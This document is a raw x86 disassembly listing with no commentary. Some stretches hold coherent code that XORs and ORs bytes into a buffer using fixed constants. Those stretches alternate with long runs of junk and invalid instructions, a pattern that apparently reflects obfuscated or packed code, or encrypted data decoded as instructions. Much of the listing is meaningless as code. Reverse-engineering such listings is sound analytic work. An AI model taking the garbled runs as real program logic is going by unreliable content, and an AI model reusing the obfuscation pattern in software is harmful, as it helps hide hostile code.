  407daa:	sti    
  407dab:	sbb    DWORD PTR [edx+edx*1+0x322556d4],ecx
  407db2:	add    ch,BYTE PTR [ebx]
  407db4:	xchg   edi,eax
  407db5:	xchg   dl,cl
  407db7:	stos   DWORD PTR es:[edi],eax
  407db8:	and    edi,DWORD PTR [edx-0x15]
  407dbb:	in     al,0x2f
  407dbd:	mov    edi,DWORD PTR [ebx+ecx*1+0x56a2ee2d]
  407dc4:	push   ecx
  407dc5:	xchg   edx,eax
  407dc6:	xor    BYTE PTR [ebx-0x4688090],0x86
  407dcd:	and    BYTE PTR [eax],bl
  407dcf:	xchg   ecx,eax
  407dd0:	lock pop ebp
  407dd2:	jge    0x407d6e
  407dd4:	jmp    0x5ea9:0xdbe36447
  407ddb:	(bad)  [esi]
  407ddd:	mov    esp,0x115fc3aa
  407de2:	pop    edi
  407de3:	xor    edx,DWORD PTR [ecx-0x31ba8fdd]
  407de9:	xchg   BYTE PTR [eax],ch
  407deb:	stos   BYTE PTR es:[edi],al
  407dec:	push   0x27cd8931
  407df1:	push   es
  407df2:	mov    esp,edi
  407df4:	mov    esp,0xa12a638c
  407df9:	push   cs
  407dfa:	pop    edx
  407dfb:	(bad)  
  407dfc:	outs   dx,BYTE PTR ds:[esi]
  407dfd:	icebp  
  407dfe:	dec    esp
  407dff:	stc    
  407e00:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  407e02:	data16 ds mov dh,0x9b
  407e06:	or     BYTE PTR [esi],bl
  407e08:	adc    eax,0x6dd72e55
  407e0d:	aam    0x8b
  407e0f:	dec    ebp
  407e10:	or     al,0xf
  407e12:	lods   al,BYTE PTR ds:[esi]
  407e13:	enter  0xc102,0xe9
  407e17:	add    cl,BYTE PTR [ebx+0x558b084d]
  407e1d:	or     al,0x33
  407e1f:	mov    ecx,0xd2331ee1
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x422738
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x422738
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0xad
  407ec6:	shl    DWORD PTR [edi+ecx*8-0x41419a42],0xbd
  407ece:	les    edi,FWORD PTR [esi-0x7116aa42]
  407ed4:	ror    DWORD PTR [edx-0x3bb6bc89],0x74
  407edb:	addr16 shr edi,cl
  407ede:	push   es
  407edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee0:	sbb    ecx,edi
  407ee2:	mov    dl,0x1c
  407ee4:	or     al,0x57
  407ee6:	(bad)  
  407ee7:	mov    ebx,0xc6c4c8fa
  407eec:	lods   eax,DWORD PTR ds:[esi]
  407eed:	inc    esi
  407eee:	add    al,0xb3
  407ef0:	jnp    0x407f5c
  407ef2:	ror    dh,0x7c
  407ef5:	xor    DWORD PTR [edi-0x77],ecx
  407ef8:	sbb    ch,BYTE PTR [bx+si-0x4ee2]
  407efd:	mov    ah,0xd3
  407eff:	cmovbe ecx,DWORD PTR [ebp-0x6a311711]
  407f06:	add    BYTE PTR [ecx],ch
  407f08:	aas    
  407f09:	outs   dx,DWORD PTR ds:[esi]
  407f0a:	xchg   edi,eax
  407f0b:	test   BYTE PTR cs:[ecx-0x50a7358a],bl
  407f12:	retf   
  407f13:	mov    eax,ds:0x72fd8b91
  407f18:	(bad)  
  407f19:	and    BYTE PTR [esi+0x19407e6b],ch
  407f1f:	cli    
  407f20:	or     ecx,DWORD PTR [edx-0xa7171f]
  407f26:	add    eax,0xb2700658
  407f2b:	fmul   DWORD PTR [eax-0x4b]
  407f2e:	mov    bl,0xc4
  407f30:	scas   al,BYTE PTR es:[edi]
  407f31:	mov    esi,0xd31c0086
  407f36:	(bad)  
  407f38:	dec    edx
  407f39:	pop    edi
  407f3a:	pop    ebx
  407f3b:	mov    gs,WORD PTR [edi]
  407f3d:	xor    eax,0x8d4c2dc9
  407f42:	fdiv   QWORD PTR [eax]
  407f44:	in     al,dx
  407f45:	inc    edx
  407f46:	mov    al,0x6
  407f48:	cwde   
  407f49:	xor    esi,DWORD PTR [ebx+0xf]
  407f4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f4d:	aam    0x58
  407f4f:	dec    eax
  407f50:	jo     0x407f64
  407f52:	jae    0x407f18
  407f54:	cmp    esi,ebp
  407f56:	xor    al,0x33
  407f58:	sub    edi,DWORD PTR [edi]
  407f5a:	fisubr DWORD PTR [bp+si-0x5b]
  407f5e:	mov    esp,0x5db9edf3
  407f63:	gs xchg ecx,eax
  407f65:	inc    ecx
  407f66:	adc    eax,0x982d56aa
  407f6b:	cmp    eax,0x78e0ca5d
  407f70:	dec    esi
  407f71:	imul   ebp,DWORD PTR [ebp+0x35230603],0x519c349
  407f7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f7c:	cmp    ebx,edi
  407f7e:	leave  
  407f7f:	push   eax
  407f80:	icebp  
  407f81:	xlat   BYTE PTR ds:[ebx]
  407f82:	rol    DWORD PTR [ecx+0x1d],cl
  407f85:	ds jmp 0xa14a:0xae17e518
  407f8d:	adc    DWORD PTR [esi+0x55c40959],edi
  407f93:	popf   
  407f94:	jecxz  0x407fe3
  407f96:	sub    DWORD PTR [edx-0x7b8da72],0x3889bdd2
  407fa0:	sar    DWORD PTR [ebx+eax*8-0x31],1
  407fa4:	dec    edx
  407fa5:	fisub  WORD PTR [ebx*2-0x26f29f10]
  407fac:	neg    DWORD PTR [ebx]
  407fae:	pop    ecx
  407faf:	adc    eax,0x2e8b32e
  407fb4:	out    dx,al
  407fb5:	mov    dh,BYTE PTR [eax-0x1f]
  407fb8:	dec    eax
  407fb9:	jae    0x407f73
  407fbb:	(bad)  [ebp+edx*1-0x58fa03f9]
  407fc2:	(bad)  
  407fc3:	jmp    0x877f:0xbcb377c9
  407fca:	or     BYTE PTR [ecx-0x678fab21],0x96
  407fd1:	sub    eax,0x50291cdd
  407fd6:	inc    eax
  407fd7:	push   cs
  407fd8:	jb     0x408008
  407fda:	sub    cl,BYTE PTR [ebp-0x31]
  407fdd:	leave  
  407fde:	scas   al,BYTE PTR es:[edi]
  407fdf:	add    al,0x2a
  407fe1:	push   esi
  407fe2:	retf   0x1858
  407fe5:	inc    esi
  407fe6:	repnz enter 0x591a,0xb7
  407feb:	or     al,0xb7
  407fed:	adc    BYTE PTR [ebp-0x43460cbc],ah
  407ff3:	xchg   edi,eax
  407ff4:	in     al,dx
  407ff5:	shr    BYTE PTR ds:0xd4d13e15,cl
  407ffb:	shl    ebx,cl
  407ffd:	add    eax,0x39b05f0d
  408002:	xor    ebx,DWORD PTR [ebx]
  408004:	lock adc al,0xb4
  408007:	vsubps xmm3,xmm1,XMMWORD PTR [edx]
  40800b:	cli    
  40800c:	jns    0x407ff3
  40800e:	push   edx
  40800f:	push   0xffffffe8
  408011:	ins    BYTE PTR es:[edi],dx
  408012:	add    DWORD PTR [edi-0x68],ebx
  408015:	sahf   
  408016:	gs xchg edx,eax
  408018:	mov    ch,0x73
  40801a:	xor    eax,0xf7761fac
  40801f:	ins    BYTE PTR es:[edi],dx
  408020:	ror    DWORD PTR [esi+0x60],1
  408023:	cwde   
  408024:	icebp  
  408025:	out    0xd2,al
  408027:	add    eax,0xb1986a19
  40802c:	mov    eax,ds:0x2ba9fbaa
  408031:	dec    eax
  408032:	int3   
  408033:	pop    ecx
  408034:	aas    
  408035:	xchg   esp,eax
  408036:	nop
  408037:	xlat   BYTE PTR ds:[ebx]
  408038:	shl    ecx,0x8d
  40803b:	add    bl,bl
  40803d:	jmp    0xe71c:0x1241a13
  408044:	mov    dh,0x56
  408046:	loope  0x4080af
  408048:	iret   
  408049:	xchg   ecx,eax
  40804a:	shl    DWORD PTR [ecx+0x256d5df7],cl
  408050:	jmp    0x279333c6
  408055:	inc    ebx
  408056:	sbb    dl,BYTE PTR [edx+0x71b7fcff]
  40805c:	mov    ds:0x6eccc38b,al
  408061:	out    0x75,al
  408063:	dec    edi
  408064:	dec    ebp
  408065:	xor    DWORD PTR [ebx+0x53],ecx
  408068:	jne    0x408048
  40806a:	cdq    
  40806b:	inc    ebx
  40806c:	in     al,dx
  40806d:	call   0xa230f0af
  408072:	sub    edx,eax
  408074:	aad    0x1f
  408076:	jmp    0x40803c
  408078:	dec    esp
  408079:	mov    eax,0x8205d3d
  40807e:	in     eax,dx
  40807f:	fisub  WORD PTR gs:[esi]
  408082:	je     0x4080cc
  408084:	mov    al,ds:0xeb69bf66
  408089:	pop    esp
  40808a:	mov    ebp,0x8eb172ab
  40808f:	lods   al,BYTE PTR ds:[esi]
  408090:	push   cx
  408092:	in     al,0x1
  408094:	push   0xffffffe6
  408096:	pop    esp
  408097:	retf   0x3f66
  40809a:	sbb    al,0x6e
  40809c:	lds    edx,FWORD PTR [ecx+0x69]
  40809f:	in     al,0x5c
  4080a1:	cmp    ch,0xe9
  4080a4:	call   0xb5b0:0x56bf2ed8
  4080ab:	sub    BYTE PTR [edi+eax*4+0xc],0xa
  4080b0:	pop    edi
  4080b1:	adc    cl,bh
  4080b3:	jge    0x40803d
  4080b5:	or     ch,BYTE PTR [edx+ebx*2-0x76]
  4080b9:	inc    ebp
  4080ba:	js     0x4080ed
  4080bc:	adc    DWORD PTR [esi+0xe07df18],eax
  4080c2:	mov    cl,BYTE PTR [edx]
  4080c4:	mov    ebx,0xa755a15e
  4080c9:	xor    BYTE PTR [ebp+edi*8+0x67],bh
  4080cd:	(bad)  
  4080ce:	stos   BYTE PTR es:[edi],al
  4080cf:	cs push ebx
  4080d1:	xor    DWORD PTR [edi+0x1e],ecx
  4080d4:	sub    al,0xea
  4080d6:	ins    BYTE PTR es:[edi],dx
  4080d7:	and    eax,0x945ea32d
  4080dc:	dec    esi
  4080dd:	adc    al,0x14
  4080df:	fld    DWORD PTR [ebx+0x4d]
  4080e2:	(bad)  
  4080e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e4:	aad    0x36
  4080e6:	mov    ch,0xd7
  4080e8:	jo     0x4080ab
  4080ea:	xchg   edi,eax
  4080eb:	loopne 0x408151
  4080ed:	mov    al,ds:0x9782ff65
  4080f2:	dec    ebx
  4080f3:	push   es
  4080f4:	sub    edi,DWORD PTR [edx+0x7c]
  4080f7:	or     edx,DWORD PTR [ecx-0x6a]
  4080fa:	jnp    0x408139
  4080fc:	ss cmp dh,cl
  4080ff:	in     eax,0x55
  408101:	jmp    0x4080cb
  408103:	sub    eax,DWORD PTR [edi+0x720bf7c2]
  408109:	pop    edi
  40810a:	dec    edx
  40810b:	add    dh,bl
  40810d:	mov    edi,0x2ea78707
  408112:	adc    al,0x10
  408114:	sti    
  408115:	xor    ebx,edx
  408117:	pop    ebx
  408118:	xchg   ebx,eax
  408119:	mov    ?,esp
  40811b:	xor    eax,ebp
  40811d:	mov    bh,0x4
  40811f:	xor    dl,0x25
  408122:	lds    edi,FWORD PTR [eax]
  408124:	(bad)  
  408125:	cmp    edi,esp
  408127:	std    
  408128:	sbb    al,0xe8
  40812a:	or     al,0x95
  40812c:	sub    al,0x17
  40812e:	arpl   WORD PTR [esi],ax
  408130:	sahf   
  408131:	fld    DWORD PTR [esi+edi*8-0x168e0445]
  408138:	mov    ebx,0xbd81088e
  40813d:	mov    al,ds:0x3bbd0f2a
  408142:	sbb    bl,BYTE PTR [edx]
  408144:	dec    esi
  408145:	fsubr  QWORD PTR [ebp+0x4e]
  408148:	inc    ebx
  408149:	push   ecx
  40814a:	mov    dl,0x76
  40814c:	adc    bh,BYTE PTR [esi]
  40814e:	inc    bl
  408150:	dec    edi
  408151:	inc    eax
  408153:	stos   BYTE PTR es:[edi],al
  408154:	or     dh,BYTE PTR ds:0x4bcb4575
  40815a:	jg     0x4080fb
  40815c:	add    al,0x91
  40815e:	fnstenv [esi-0x704877bf]
  408164:	add    al,0x1d
  408166:	fbld   TBYTE PTR [eax]
  408168:	pop    edx
  408169:	or     eax,0xef4fbc74
  40816e:	adc    esp,DWORD PTR [eax+0x19]
  408171:	fmul   st(1),st
  408173:	or     dl,BYTE PTR [ebx+edx*2+0x2d80a277]
  40817a:	sub    DWORD PTR [edi-0x2dde1553],eax
  408180:	jp     0x4081df
  408182:	mov    ebx,0xcaa079dc
  408187:	dec    esp
  408188:	lods   al,BYTE PTR ds:[esi]
  408189:	push   ecx
  40818a:	add    DWORD PTR ds:0xb9e834a7,0x68ce3263
  408194:	test   DWORD PTR [ebx+0x6c],ebx
  408197:	mov    ebp,0x46693d7f
  40819c:	push   edi
  40819d:	nop
  40819e:	cmc    
  40819f:	inc    ecx
  4081a0:	add    al,BYTE PTR [ebx-0x66]
  4081a3:	pushf  
  4081a4:	or     DWORD PTR [eax],eax
  4081a6:	mov    ?,WORD PTR [ebx+0x55a06f02]
  4081ac:	adc    BYTE PTR [esi+0x1523fa79],0x42
  4081b3:	sub    bh,BYTE PTR [esi-0x75c37ed6]
  4081b9:	add    eax,0x85c8d455
  4081be:	mov    ds,WORD PTR [ebx+0x196f590]
  4081c4:	gs ret 
  4081c6:	xchg   ecx,eax
  4081c7:	and    BYTE PTR [edx-0x4d],bl
  4081ca:	ds cld 
  4081cc:	and    edx,DWORD PTR [esp+ebp*1-0x3b]
  4081d0:	sbb    eax,0x48270d86
  4081d5:	push   edx
  4081d6:	ins    BYTE PTR es:[edi],dx
  4081d7:	psraw  mm1,QWORD PTR [ecx]
  4081da:	mov    al,0xc
  4081dc:	mov    dl,0xac
  4081de:	ret    
  4081df:	outs   dx,DWORD PTR ds:[esi]
  4081e0:	mov    dh,0x10
  4081e2:	sub    ah,BYTE PTR [edi-0x2f49327f]
  4081e8:	mov    ecx,0x5e6712ac
  4081ed:	mov    edx,0x501e713c
  4081f2:	jmp    0x40822c
  4081f4:	idiv   BYTE PTR [ebx+0xb35ac95]
  4081fa:	mov    ds:0x3ebe9a34,eax
  408200:	adc    ebp,DWORD PTR [esi+0x3162b610]
  408206:	sub    DWORD PTR [esi],edi
  408208:	leave  
  408209:	jmp    0x408287
  40820b:	adc    BYTE PTR [ecx+edi*4+0x18ee8576],cl
  408212:	dec    esi
  408213:	pop    DWORD PTR [ebp-0x5b5927e8]
  408219:	xchg   esi,eax
  40821a:	jecxz  0x4081e7
  40821c:	jb     0x408220
  40821e:	cmp    al,0x6a
  408220:	xor    eax,0xcaea4cd4
  408225:	addr16 leave 
  408227:	sbb    dh,BYTE PTR [edi+0x4cb6bf1]
  40822d:	fistp  QWORD PTR [ecx-0x15f0d9b8]
  408233:	and    edi,DWORD PTR [ebp+0x78b5cec1]
  408239:	xchg   ebx,eax
  40823a:	addr16 into 
  40823c:	fisubr DWORD PTR [edi]
  40823e:	loop   0x408209
  408240:	cmp    eax,DWORD PTR [edi+0x4e5dcba7]
  408246:	pop    ebx
  408247:	sbb    DWORD PTR [ecx],ecx
  408249:	pusha  
  40824a:	test   eax,0x614f472
  40824f:	sbb    eax,0xbb6e80ea
  408254:	cli    
  408255:	xor    edx,edx
  408257:	or     eax,edx
  408259:	add    eax,DWORD PTR ds:0x422738
  40825f:	shl    ecx,0x1e
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x422738
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	fistp  QWORD PTR [eax]
  40844e:	fninit 
  408450:	mov    ebp,0xbdbebe6b
  408455:	les    edi,FWORD PTR [esi+0x2d8f8ebe]
  40845b:	xchg   esp,eax
  40845c:	jge    0x408437
  40845e:	jge    0x4084b5
  408460:	das    
  408461:	scas   eax,DWORD PTR es:[edi]
  408462:	stc    
  408463:	inc    eax
  408464:	dec    eax
  408465:	xchg   edi,eax
  408466:	aam    0xcb
  408468:	div    eax
  40846a:	outs   dx,BYTE PTR ds:[esi]
  40846b:	adc    DWORD PTR [edi],0xf88ce7cc
  408471:	adc    edi,esi
  408473:	xchg   cl,bh
  408475:	lahf   
  408476:	inc    esi
  408477:	and    ebp,edx
  408479:	fcomi  st,st(2)
  40847b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40847c:	push   0xfffffff6
  40847e:	js     0x40843e
  408480:	add    eax,0x23806a2d
  408485:	jmp    0xd3b7:0x23ba7d87
  40848c:	mov    ds:0x3405d9a2,al
  408491:	in     al,0x4e
  408493:	in     al,0x68
  408495:	les    edx,FWORD PTR [edi]
  408497:	mov    eax,0xd7da1922
  40849c:	mov    DWORD PTR [esi+0x62],ebx
  40849f:	jle    0x408516
  4084a1:	call   0xa4000f56
  4084a6:	mov    dl,0xc8
  4084a8:	jle    0x408529
  4084aa:	and    esi,DWORD PTR [edx-0x52868809]
  4084b0:	pop    edi
  4084b1:	dec    esi
  4084b2:	je     0x408463
  4084b4:	and    DWORD PTR [edi-0x653fe290],edi
  4084ba:	sub    bl,BYTE PTR [edi]
  4084bc:	add    DWORD PTR [eax+0x5c],ecx
  4084bf:	xor    eax,0x9bdddbbd
  4084c4:	sub    eax,0x55dd0e76
  4084c9:	enter  0x58e7,0x3a
  4084cd:	adc    al,0x40
  4084cf:	call   0xd454:0x3994f639
  4084d6:	add    ch,al
  4084d8:	lahf   
  4084d9:	push   ds
  4084da:	retf   0x8e91
  4084dd:	mov    ebx,0xa6f0d03f
  4084e2:	fcmovbe st,st(5)
  4084e4:	inc    eax
  4084e5:	sar    DWORD PTR [ecx],1
  4084e7:	jae    0x408490
  4084e9:	dec    esi
  4084ea:	fadd   st,st(0)
  4084ec:	test   DWORD PTR [edi+edx*8],0x3f945b7d
  4084f3:	add    ebp,DWORD PTR [ecx]
  4084f5:	ret    
  4084f6:	xchg   BYTE PTR [edi],bl
  4084f8:	sbb    ch,bh
  4084fa:	push   cs
  4084fb:	rcl    BYTE PTR [edx+esi*2],cl
  4084fe:	(bad)  
  4084ff:	ins    BYTE PTR es:[edi],dx
  408500:	mov    eax,DWORD PTR [ebx]
  408502:	js     0x40857e
  408504:	test   al,0x16
  408506:	dec    ebx
  408507:	jecxz  0x408561
  408509:	cwde   
  40850a:	cdq    
  40850b:	cs aad 0x22
  40850e:	pushf  
  40850f:	sbb    cl,BYTE PTR ss:[ebx-0x751075d1]
  408516:	xchg   DWORD PTR [esi+0x7fa67dcc],ecx
  40851c:	add    BYTE PTR [eax-0x28d7672e],0x66
  408523:	call   0x5b15:0xc6e76367
  40852a:	outs   dx,DWORD PTR ds:[esi]
  40852b:	stos   DWORD PTR es:[edi],eax
  40852c:	aas    
  40852d:	cmp    ecx,DWORD PTR [ecx]
  40852f:	(bad)  
  408530:	jno    0x40858e
  408532:	push   ebx
  408533:	push   cs
  408534:	ins    DWORD PTR es:[edi],dx
  408535:	in     eax,dx
  408536:	push   ebx
  408537:	dec    eax
  408538:	pop    esi
  408539:	inc    esp
  40853a:	stc    
  40853b:	stos   DWORD PTR es:[edi],eax
  40853c:	push   ecx
  40853d:	int    0x3c
  40853f:	out    dx,eax
  408540:	enter  0xb3d1,0x8c
  408544:	cmp    BYTE PTR [edi],dl
  408546:	xor    eax,0x5ba26c86
  40854b:	dec    ebx
  40854c:	push   ebx
  40854d:	loopne 0x408563
  40854f:	call   0xdec55be3
  408554:	pop    esp
  408555:	cmp    ch,BYTE PTR [eax+esi*2]
  408558:	xor    eax,0x61e3b075
  40855d:	and    ah,ch
  40855f:	push   ebx
  408560:	outs   dx,DWORD PTR ds:[esi]
  408561:	sar    eax,cl
  408563:	retf   0x98a1
  408566:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408567:	cmp    eax,0xdc5f649d
  40856c:	xchg   ebx,eax
  40856d:	cmp    ch,cl
  40856f:	pop    ecx
  408570:	ret    
  408571:	shr    BYTE PTR [esi+0x48],0x0
  408575:	js     0x4085e7
  408577:	cdq    
  408578:	jns    0x4085af
  40857a:	rcl    DWORD PTR [esi+0x779c004d],cl
  408580:	mov    ch,0x65
  408582:	es push 0xa
  408585:	mov    DWORD PTR [edi-0x27bec901],edi
  40858b:	or     BYTE PTR [ebp+0x555b9ad4],dl
  408591:	inc    eax
  408592:	mov    eax,0x31c4712
  408597:	test   al,0x79
  408599:	loopne 0x4085e3
  40859b:	adc    eax,0x376436cd
  4085a0:	and    edx,edi
  4085a2:	or     DWORD PTR [esi-0x7a8857f5],edx
  4085a8:	mov    cl,0x32
  4085aa:	(bad)  
  4085ab:	sbb    BYTE PTR [ebx-0x32408e69],al
  4085b1:	push   esp
  4085b2:	and    DWORD PTR [esi-0x77],eax
  4085b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085b6:	lods   al,BYTE PTR ds:[esi]
  4085b7:	retf   
  4085b8:	push   esi
  4085b9:	dec    esi
  4085ba:	aaa    
